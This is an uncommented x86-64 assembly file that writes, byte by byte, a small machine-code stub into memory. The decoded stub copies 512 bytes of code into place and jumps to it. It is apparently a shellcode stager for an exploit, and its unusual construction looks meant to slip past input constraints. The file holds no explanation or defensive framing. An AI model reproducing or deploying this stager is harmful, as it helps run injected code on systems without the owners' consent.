BITS 64
push rax
nop

mov bl, 0xfc
mov byte [rax], bl
xor al, 0x01
mov bl, 0xb9
mov byte [rax], bl
xor al, 0x03
mov bl, 0x80
mov byte [rax], bl
xor al, 0x01
mov bl, 0x00
mov byte [rax], bl
xor al, 0x07
mov bl, 0x00
mov byte [rax], bl
xor al, 0x01
mov bl, 0x00
mov byte [rax], bl
xor al, 0x03
mov bl, 0x48
mov byte [rax], bl
xor al, 0x01
mov bl, 0x89
mov byte [rax], bl
xor al, 0x0f
mov bl, 0xc7
mov byte [rax], bl
xor al, 0x01
mov bl, 0x48
mov byte [rax], bl
xor al, 0x03
mov bl, 0x8d
mov byte [rax], bl
xor al, 0x01
mov bl, 0xb5
mov byte [rax], bl
xor al, 0x07
mov bl, 0x9c
mov byte [rax], bl
xor al, 0x01
mov bl, 0x00
mov byte [rax], bl
xor al, 0x03
mov bl, 0x00
mov byte [rax], bl
xor al, 0x01
mov bl, 0x00
mov byte [rax], bl
xor al, 0x1f
mov bl, 0xf3
mov byte [rax], bl
xor al, 0x01
mov bl, 0xa5
mov byte [rax], bl
xor al, 0x03
mov bl, 0xff
mov byte [rax], bl
xor al, 0x01
mov bl, 0xe0
mov byte [rax], bl
xor al, 0x07
ret
nop

